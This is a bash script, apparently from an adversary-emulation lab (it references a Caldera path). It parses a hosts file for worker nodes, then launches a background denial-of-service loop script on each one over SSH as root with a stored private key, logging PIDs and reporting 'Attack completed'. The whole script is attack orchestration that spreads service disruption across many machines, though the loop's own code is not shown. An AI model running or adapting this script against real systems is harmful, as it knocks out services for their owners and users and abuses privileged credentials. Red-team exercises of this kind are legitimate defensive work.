#!/usr/bin/env bash
set -euo pipefail

BASE="$DATA_PATH/KC5"
FILE_IP="$BASE/iphost"
KEY_PATH="$BASE/ssh/ssh-key"
LOG_DIR="$BASE/logs"
PID_LIST="$BASE/pids"

list_node_hostnames() {
  if [[ ! -f "$FILE_IP" ]]; then
    echo "Error: file '$FILE_IP' not found" >&2
    return 1
  fi

  echo ">> Recover IPs list (file: $FILE_IP)..." >&2
  grep -E '[-]' "$FILE_IP" \
   | cut -d'-' -f2- \
   | sed -E 's/^[[:space:]]+|[[:space:]\r]+$//g' \
   | grep worker \
   | cut -d'.' -f1 \
   | sort -u
}

mapfile -t nodes < <(list_node_hostnames | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"; exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"
for n in "${nodes[@]}"; do
  LOG_FILE="$LOG_DIR/$n-dos.log"
  nohup /opt/caldera/common/dos-loop.sh "ssh -p 2222 -i $KEY_PATH root@$n" >>"$LOG_FILE" 2>&1 &
  pid=$!
  echo "$pid" | tee -a "$PID_LIST"
  echo "Attack completed for $n"
done
